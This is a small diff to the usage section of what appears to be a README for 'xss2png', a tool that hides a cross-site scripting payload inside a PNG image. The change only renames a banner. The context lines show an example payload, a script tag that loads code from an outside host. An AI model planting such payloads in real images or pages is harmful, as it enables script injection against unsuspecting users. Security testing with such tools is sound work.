@@ -17,7 +17,7 @@ Test Usage:
 $ python3 xss2png.py -p "<SCRIPT SRC=//XSS.VAVKAMIL.CZ></SCRIPT>" -o scripted.png
 [i] Using payload: <SCRIPT SRC=//XSS.VAVKAMIL.CZ></SCRIPT>
 
-XSS SCANNER
+XSS2PNG
 
 [i] Generating final PNG output
 [!] PNG output saved as: scripted.png
